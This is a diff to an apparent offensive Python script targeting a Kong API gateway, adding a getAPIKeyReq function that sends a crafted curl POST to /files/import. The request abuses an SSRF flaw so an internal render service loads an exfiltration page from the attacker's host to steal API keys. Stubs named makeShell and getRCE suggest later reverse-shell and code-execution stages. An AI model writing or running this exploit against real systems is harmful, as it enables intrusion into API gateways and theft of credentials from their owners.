@@ -118,12 +118,66 @@ def parseLogAPI():
         print(f"[!] Error in parseLogAPI: {str(e)}")
         return None
 
-def checkPlugins(url, apikey):
+def getAPIKeyReq(url, lhost):
     """
-    Checks Kong Admin Panel to see if a plugin supporting RCE is enabled on the Admin panel.
-    """
+    Sends a request to the target API gateway to trigger an SSRF vulnerability 
+    that loads our exfiltration payload.
     
-    pass
+    Args:
+        url (str): The API gateway URL (without http:// prefix)
+        lhost (str): The attacker's IP address where the exfiltration server is running
+        
+    Returns:
+        dict: Response from the API gateway or error information
+    """
+    try:
+        # Create the JSON payload, replacing the hardcoded IP with our lhost
+        payload = {
+            "url": f"http://172.16.16.5:9000/api/render?url=http://{lhost}/keys.html"
+        }
+        
+        # Convert the payload to a JSON string
+        payload_json = json.dumps(payload)
+        
+        # Construct the curl command
+        command = [
+            'curl',
+            '-X', 'POST',
+            '-H', 'Content-Type: application/json',
+            '-d', payload_json,
+            f'http://{url}:8000/files/import'
+        ]
+        
+        # Execute the curl command
+        print(f"[+] Executing: {' '.join(command)}")
+        process = subprocess.Popen(
+            command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            universal_newlines=True
+        )
+        
+        # Get the output
+        stdout, stderr = process.communicate()
+        
+        # Check for errors
+        if process.returncode != 0:
+            print(f"[!] Error executing curl command: {stderr}")
+            return {"error": stderr}
+        
+        # Try to parse the response as JSON
+        try:
+            response = json.loads(stdout)
+            print(f"[+] API gateway response: {stdout}")
+            return response
+        except json.JSONDecodeError:
+            # If it's not JSON, just return the raw output
+            print(f"[+] API gateway response (raw): {stdout}")
+            return {"raw_response": stdout}
+            
+    except Exception as e:
+        print(f"[!] Exception in getAPIKey: {str(e)}")
+        return {"error": str(e)}
 
 def makeShell(lhost, lport):
     """
@@ -224,3 +278,4 @@ def getRCE(url):
     """
 
     pass
+
